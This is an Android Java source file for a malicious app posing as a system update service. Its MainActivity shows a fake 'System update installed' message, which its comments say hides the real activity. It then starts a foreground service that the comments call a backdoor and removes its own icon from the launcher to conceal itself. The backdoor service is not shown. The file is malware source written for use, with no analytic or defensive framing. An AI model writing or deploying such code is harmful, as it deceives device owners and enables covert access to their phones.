package com.system.updateservice;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // show "updating" — user sees this, hides real activity
        Toast.makeText(this, "System update installed", Toast.LENGTH_SHORT).show();

        // start backdoor service
        Intent svc = new Intent(this, CoreService.class);
        startForegroundService(svc);

        // hide icon — remove from launcher
        getPackageManager().setComponentEnabledSetting(
            getComponentName(),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP);

        finish();
    }
}
